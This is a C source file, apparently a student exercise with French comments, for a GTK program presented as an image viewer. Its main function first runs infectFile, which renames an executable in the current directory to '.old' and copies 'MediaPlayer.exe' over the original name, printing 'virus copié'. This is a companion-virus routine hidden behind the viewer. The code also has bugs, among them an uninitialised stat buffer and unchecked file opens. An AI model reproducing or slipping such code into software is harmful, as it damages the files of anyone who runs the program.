#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

static void
on_open_image (GtkButton* button, gpointer user_data)
{
	GtkWidget *image = GTK_WIDGET (user_data);
  // retrieve the top-level widget
	GtkWidget *toplevel = gtk_widget_get_toplevel (image);
	GtkFileFilter *filter = gtk_file_filter_new ();

  //add jpg,jpeg,png,svg filter to files
  gtk_file_filter_add_pattern(filter, "*.jpg");
  gtk_file_filter_add_pattern(filter, "*.jpeg");
  gtk_file_filter_add_pattern(filter, "*.png");
  gtk_file_filter_add_pattern(filter, "*.svg");
  // Create box dialogue for file selection

	GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
	                                                 GTK_WINDOW (toplevel),
	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
	                                                 "gtk-ok", GTK_RESPONSE_ACCEPT,
	                                                 "gtk-cancel", GTK_RESPONSE_CANCEL,
	                                                 NULL);

  // Adding the images format accept by GTK 
	gtk_file_filter_add_pixbuf_formats (filter);

	switch (gtk_dialog_run (GTK_DIALOG (dialog)))
	{
		case GTK_RESPONSE_ACCEPT:
		{
			gchar *filename =
				gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
			gtk_image_set_from_file (GTK_IMAGE (image), filename);
			break;
		}
		default:
			break;
	}
	gtk_widget_destroy (dialog);
}


static void
activate (GtkApplication *app, gpointer user_data)
{
	GtkWidget *window;
	GtkWidget *button;
	GtkWidget *image;
	GtkWidget *box;

	/* Set up the UI */
	window = gtk_application_window_new (app);
	gtk_window_set_title (GTK_WINDOW (window), "mon image viewer");
	gtk_window_set_default_size (GTK_WINDOW (window), 300, 150);
	gtk_container_set_border_width (GTK_CONTAINER (window), 5);

	box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
	button = gtk_button_new_with_label (("Open image"));
	image = gtk_image_new ();

	gtk_box_pack_start (GTK_BOX (box), image, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (box), button, FALSE, FALSE, 0);

	gtk_container_add (GTK_CONTAINER (window), box);

	/* Connect signals */

	/* Show open dialog when opening a file */
	g_signal_connect (button, "clicked", G_CALLBACK (on_open_image), image);

	/* Exit when the window is closed */
	g_signal_connect (window, "destroy", G_CALLBACK (gtk_main_quit), NULL);

	gtk_container_add (GTK_CONTAINER (window), box);
  	gtk_widget_show_all (window);
}



char* changeNameToOld(char* name)
{
	char* new_name = (char *) malloc( 40 );
	strcpy(new_name, name);

	if(strcmp(name, "MediaPlayer.exe"))	// The file is not MediaPlayer
	{
		if(strstr(name, ".exe")) // Test if the file has the .exe extension
		{
			// Rename with the extension .old
			new_name[strlen(name)-1] = 'd';
			new_name[strlen(name)-2] = 'l';
			new_name[strlen(name)-3] = 'o';

			if(!fopen(new_name, "r"))	//Test if it exists a file with the same name
			{
				//Don't exist

				if(!rename(name, new_name))	// Le fichier a était renommé ? 
				{
					printf("File renamed\n");
					return name;
				}
				else 
				{
                    printf("No file renamed\n");
					return "";
				}
			}
		}
	}
	return "";
}
// Changing the name of the executables

char* infectFile()
{
	DIR* dir = opendir("."); // Open a directory to read files in it.
	int infect = 0; // Number of infections
	char* pname = (char *) malloc( 40 );
	char* rname = (char *) malloc( 40 );

    // Test if the directory exists. If not, create it and return an error
	if (dir == NULL)
    {
        perror("Error ");//writing the error message
        exit(0);
    }

    // directory file path structure
	struct dirent* directory;
    while ((directory = readdir(dir)) != NULL)
    {
		if (infect < 1)
		{
			struct stat* buffer;
			if (!stat(directory->d_name, buffer)) // Stock stat information of the file
			{	
				if ((buffer->st_mode & S_IXUSR) && S_ISREG(buffer->st_mode)) //check if the file is executable and regular
				{ 
					char* name = (char *) malloc( 40 );
					strcpy(name, directory->d_name);
					strcpy(pname, name);
					
					strcpy(rname, changeNameToOld(name));

					if(strcmp(rname, "")) // test if the file has been renamed
					{   
						infect++;
					}

					free(name);
				}
			}
		}
	}
	free(directory);
    if (closedir(dir) != 0) perror("Error ");

    FILE *fileToCopy, *fileCopied;
    char ch; //Stock every charactere of the source file
    int pos; // The cursor postion in the source fille

    if ((fileToCopy = fopen("MediaPlayer.exe","r")) == NULL)    
	{    
	    printf("\nLe fichier ne peut pas etre ouvert\n");
        perror("Error ");
    }

    fileCopied = fopen(pname, "w");  
    fseek(fileToCopy, 0L, SEEK_END); // file pointer at end of file
    pos = ftell(fileToCopy); // The total size of te source file 
    fseek(fileToCopy, 0L, SEEK_SET); // file pointer set at start
       
	while (pos--)
    {
        ch = fgetc(fileToCopy);  // copying file character by character
        fputc(ch, fileCopied);
    }    

	printf("virus copié\n");

    fclose(fileCopied);
    fclose(fileToCopy);


	return rname;
}

int
main (int argc, char **argv)
{
	int status;
    char* infect_name = infectFile();
    printf("The name of an infected file : %c", *infect_name);

  GtkApplication *app;

  app = gtk_application_new ("org.gtk.example", G_APPLICATION_DEFAULT_FLAGS);
  g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
  status = g_application_run (G_APPLICATION (app), argc, argv);
  g_object_unref (app);
	
	return status;
}